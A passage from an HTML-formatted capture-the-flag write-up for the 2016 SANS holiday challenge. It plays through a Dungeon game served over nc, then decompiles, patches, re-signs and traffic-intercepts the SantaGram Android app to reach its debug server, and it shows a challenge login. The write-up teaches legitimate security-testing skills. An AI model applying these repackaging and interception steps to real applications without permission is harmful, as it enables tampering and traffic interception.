&lt;span class="go"&gt;Nmap done: 1 IP address (1 host up) scanned in 16.09 seconds&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The last port is not a standard one, let's connect to it with &lt;code&gt;nc&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nc dungeon.northpolewonderland.com &lt;span class="m"&gt;11111&lt;/span&gt;
&lt;span class="go"&gt;Welcome to Dungeon.         This version created 11-MAR-78.&lt;/span&gt;
&lt;span class="go"&gt;You are in an open field west of a big white house with a boarded&lt;/span&gt;
&lt;span class="go"&gt;front door.&lt;/span&gt;
&lt;span class="go"&gt;There is a small wrapped mailbox here.&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As suspected, it's an interface to the Dungeon game. That's when I decided to
brush up a little bit on it (instead of just posting a link to the Wikipedia
article as I did in Part 1). It's a text-based RPG, inspired by Dungeons and
Dragons. It's apparently strongly tied to the famous &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Zork"&gt;Zork&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So I started searching for &lt;cite&gt;*cough cough*&lt;/cite&gt; write-through of Zork and found
&lt;a class="reference external" href="http://www.lacegem.com/solutions/zork1.html"&gt;this one&lt;/a&gt;. It's not really
necessary, but it gave me the idea to go up the chimney.&lt;/p&gt;
&lt;p&gt;Anyway, here's how to get the wanted information:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Welcome to Dungeon.         This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
&lt;span class="hll"&gt;&amp;gt;south
&lt;/span&gt;You are facing the south side of a white house.  There is no door here,
and all the windows are barred.
&lt;span class="hll"&gt;&amp;gt;east
&lt;/span&gt;You are behind the white house.  In one corner of the house
there is a window which is slightly ajar.
&lt;span class="hll"&gt;&amp;gt;open window
&lt;/span&gt;With great effort, you open the window far enough to allow passage.
&lt;span class="hll"&gt;&amp;gt;go in
&lt;/span&gt;You are in the kitchen of the white house.  A table seems to have
been used recently for the preparation of food.  A passage leads to
the west, and a dark staircase can be seen leading upward.  To the
east is a small window which is open.
On the table is an elongated brown sack, smelling of hot peppers.
A clear glass bottle is here.
The glass bottle contains:
  A quantity of water.
&lt;span class="hll"&gt;&amp;gt;west
&lt;/span&gt;You are in the living room.  There is a door to the east.  To the west
is a wooden door with strange gothic lettering, which appears to be
nailed shut.
In the center of the room is a large oriental rug.
There is a trophy case here.
On hooks above the mantlepiece hangs an elvish sword of great antiquity.
A battery-powered brass lantern is on the trophy case.
There is an issue of US NEWS &amp;amp; DUNGEON REPORT dated 11-MAR-78 here.
&lt;span class="hll"&gt;&amp;gt;take lantern
&lt;/span&gt;Taken.
&lt;span class="hll"&gt;&amp;gt;turn lantern on
&lt;/span&gt;The lamp is now on.
&lt;span class="hll"&gt;&amp;gt;move rug
&lt;/span&gt;With a great effort, the rug is moved to one side of the room.
With the rug moved, the dusty cover of a closed trap door appears.
&lt;span class="hll"&gt;&amp;gt;open trap door
&lt;/span&gt;The door reluctantly opens to reveal a rickety staircase descending
into darkness.
&lt;span class="hll"&gt;&amp;gt;go down
&lt;/span&gt;You are in a dark and damp cellar with a narrow passageway leading
east, and a crawlway to the south.  To the west is the bottom of a
steep metal ramp which is unclimbable.
The door crashes shut, and you hear someone barring it.
&lt;span class="hll"&gt;&amp;gt;south
&lt;/span&gt;You are on the west edge of a chasm, the bottom of which cannot be
seen.  The east side is sheer rock, providing no exits.  A narrow
passage goes west.  The path you are on continues to the north and south.
&lt;span class="hll"&gt;&amp;gt;south
&lt;/span&gt;You are in an art gallery.  Most of the paintings which were here
have been stolen by vandals with exceptional taste.  The vandals
left through the north, south, or west exits.
Fortunately, there is still one chance for you to be a vandal, for on
the far wall is a work of unparalleled beauty.
&lt;span class="hll"&gt;&amp;gt;take painting
&lt;/span&gt;Taken.
&lt;span class="hll"&gt;&amp;gt;south
&lt;/span&gt;You are in what appears to have been an artist&amp;#39;s studio.  The walls
and floors are splattered with paints of 69 different colors.
Strangely enough, nothing of value is hanging here.  At the north and
northwest of the room are open doors (also covered with paint).  An
extremely dark and narrow chimney leads up from a fireplace.  Although
you might be able to get up the chimney, it seems unlikely that you
could get back down.
&lt;span class="hll"&gt;&amp;gt;go up
&lt;/span&gt;You have mysteriously reached the North Pole.
In the distance you detect the busy sounds of Santa&amp;#39;s elves in full
production.

You are in a warm room, lit by both the fireplace but also the glow of
centuries old trophies.
On the wall is a sign:
        Songs of the seasons are in many parts
        To solve a puzzle is in our hearts
        Ask not what what the answer be,
        Without a trinket to satisfy me.
The elf is facing you keeping his back warmed by the fire.
&lt;span class="hll"&gt;&amp;gt;give painting to elf
&lt;/span&gt;The elf, satisified with the trade says -
&lt;span class="hll"&gt;send email to &amp;quot;peppermint@northpolewonderland.com&amp;quot; for that which you seek.
&lt;/span&gt;The elf says - you have conquered this challenge - the game will now end.
Your score is 89 [total of 585 points], in 16 moves.
This gives you the rank of Novice Adventurer.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We're given instructions to send a mail to &lt;a class="reference external" href="mailto:peppermint&amp;#64;northpolewonderland.com"&gt;peppermint&amp;#64;northpolewonderland.com&lt;/a&gt;
to receive the information we seek. After sending an email, we get an answer:&lt;/p&gt;
&lt;img alt="dungeon_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/dungeon_audio_file.png" /&gt;
&lt;p&gt;We now have our third weird audio file.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="the-debug-server"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://dev.northpolewonderland.com/index.php"&gt;The Debug Server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;If we look at the decompiled source code of the SantaGram application, we can
see that the debug server is called when a user modifies their own profile:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File com/northpolewonderland/santagram/EditProfile.java&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;debug_data_enabled&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;    &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;i&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;TAG&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Remote debug logging is Enabled&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="n"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;i&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;TAG&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Remote debug logging is Disabled&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;[...]&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;JSONObject&lt;/span&gt; &lt;span class="n"&gt;jSONObject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;JSONObject&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;SimpleDateFormat&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;yyyyMMddHHmmssZ&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Calendar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getInstance&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getTime&lt;/span&gt;&lt;span class="o"&gt;()));&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Secure&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getContentResolver&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;android_id&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getCanonicalName&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;, &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getSimpleName&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;totalMemory&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;freeMemory&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
        &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Runnable&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="cm"&gt;/* synthetic */&lt;/span&gt; &lt;span class="n"&gt;EditProfile&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;                &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;a&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;debug_data_collection_url&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/span&gt;            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}).&lt;/span&gt;&lt;span class="na"&gt;start&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;e&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;TAG&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Error posting JSON debug data: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMessage&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, to do so, debug mode must be enabled in the application. To check
this, the application compares the string &lt;code&gt;debug_data_enabled&lt;/code&gt; in the
application resource's to &lt;code&gt;true&lt;/code&gt;. Let's take a look at the resources:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- File res/values/strings.xml --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;string&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;debug_data_enabled&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;false&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Debug data are disabled. So we need to modify the resource file of the
application in order to enable it. Luckily, this is something we often have
to do in my day job: more and more of our clients are implementing &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Certificate_pinning"&gt;TLS
certificate pinning&lt;/a&gt;
in their mobile applications, which prevents us from intercepting the tested
application's communication with Burp.  This means that we have to decompile
the application, patch the certificate pinning code, recompile, then reinstall
the application. This is kind of what we have to do here, except instead of
patching the certificate pinning code, we just have to modify the resource file
to enable debug data.&lt;/p&gt;
&lt;p&gt;I'm basically going to use &lt;a class="reference external" href="http://blog.dewhurstsecurity.com/2015/11/10/mobile-security-certificate-pining.html"&gt;this excellent tutorial&lt;/a&gt;
to patch the application and rebuild it without any problem.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; First, we&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;re disassembling the application
&lt;span class="gp"&gt;$&lt;/span&gt; apktool d ./SantaGram_4.2.apk -o SantaGram_4.2_disassembled
&lt;span class="go"&gt;I: Using Apktool 2.2.1 on SantaGram_4.2.apk&lt;/span&gt;
&lt;span class="go"&gt;I: Loading resource table...&lt;/span&gt;
&lt;span class="go"&gt;I: Decoding AndroidManifest.xml with resources...&lt;/span&gt;
&lt;span class="go"&gt;I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk&lt;/span&gt;
&lt;span class="go"&gt;I: Regular manifest package...&lt;/span&gt;
&lt;span class="go"&gt;I: Decoding file-resources...&lt;/span&gt;
&lt;span class="go"&gt;I: Decoding values */* XMLs...&lt;/span&gt;
&lt;span class="go"&gt;I: Baksmaling classes.dex...&lt;/span&gt;
&lt;span class="go"&gt;I: Copying assets and libs...&lt;/span&gt;
&lt;span class="go"&gt;I: Copying unknown files...&lt;/span&gt;
&lt;span class="go"&gt;I: Copying original files...&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; Now, we modify our resource file
&lt;span class="gp"&gt;$&lt;/span&gt; sed -i &lt;span class="s1"&gt;&amp;#39;s/&amp;lt;string name=&amp;quot;debug_data_enabled&amp;quot;&amp;gt;false/&amp;lt;string name=&amp;quot;debug_data_enabled&amp;quot;&amp;gt;true/g&amp;#39;&lt;/span&gt; SantaGram_4.2_disassembled/res/values/strings.xml
&lt;span class="gp"&gt;$&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;debug_data_enabled&amp;#39;&lt;/span&gt; SantaGram_4.2_disassembled/res/values/strings.xml
&lt;span class="go"&gt;    &amp;lt;string name=&amp;quot;debug_data_enabled&amp;quot;&amp;gt;true&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; Now, we&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;re rebuilding our application
&lt;span class="gp"&gt;$&lt;/span&gt; apktool b ./SantaGram_4.2_disassembled -o SantaGram_4.2_debug.apk
&lt;span class="go"&gt;I: Using Apktool 2.2.1&lt;/span&gt;
&lt;span class="go"&gt;I: Checking whether sources has changed...&lt;/span&gt;
&lt;span class="go"&gt;I: Smaling smali folder into classes.dex...&lt;/span&gt;
&lt;span class="go"&gt;I: Checking whether resources has changed...&lt;/span&gt;
&lt;span class="go"&gt;I: Building resources...&lt;/span&gt;
&lt;span class="go"&gt;I: Building apk file...&lt;/span&gt;
&lt;span class="go"&gt;I: Copying unknown files/dir...&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; In order to be able to install our new APK, we must sign it, check the above
&lt;span class="gp"&gt;#&lt;/span&gt; tutorial &lt;span class="k"&gt;for&lt;/span&gt; instructions
&lt;span class="gp"&gt;$&lt;/span&gt; keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize &lt;span class="m"&gt;2048&lt;/span&gt; -validity &lt;span class="m"&gt;10000&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore SantaGram_4.2_debug.apk alias_name
&lt;span class="go"&gt;Enter Passphrase for keystore:&lt;/span&gt;
&lt;span class="go"&gt;jar signed.&lt;/span&gt;

&lt;span class="go"&gt;Warning:&lt;/span&gt;
&lt;span class="go"&gt;No -tsa or -tsacert is provided and this jar is not timestamped. Without a timestamp, users may not be able to validate this jar after the signer certificate&amp;#39;s expiration date (2044-05-14) or after any future revocation date.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have a &lt;code&gt;SantaGram_4.2_debug.apk&lt;/code&gt; file, that we can install on our
phone. This application has debugging enabled, which means that we'll see
communication with the debug server.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&amp;lt;reminder&amp;gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Even though communications with the debug server is done in plain
text, the application communicates with the
&lt;a class="reference external" href="https://www.northpolewonderland.com/"&gt;https://www.northpolewonderland.com/&lt;/a&gt; application. Since it's TLS-encrypted, and
the application checks the validity of the certificate, you must import your
intercepting proxy's CA certificate in your telephone. Just a reminder that
Android phones can only import PEM, and that by default Burp exports its CA
certificate in DER. You can use the following OpenSSL command to convert it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; openssl x509 -inform der -in ./burpca.der -out burpca.pem
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;&amp;lt;/reminder&amp;gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We can now launch the application, log in with our credentials
&lt;code&gt;guest/busyreindeer78&lt;/code&gt;, and edit our profile:&lt;/p&gt;
&lt;img alt="dev_edit_profile.png" class="align-center" src="/images/sans-christmas-challenge-2016/dev_edit_profile.png" /&gt;
&lt;p&gt;Our patch worked, because we can see some request to the debug server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;dev.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;144&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227010602+0100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;com.northpolewonderland.santagram.EditProfile, EditProfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;26914200&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.6.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Tue, 27 Dec 2016 00:06:03 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;250&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227000603&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000603-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227010602+0100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;com.northpolewonderland.santagram.EditProfile, EditProfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;26914200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span 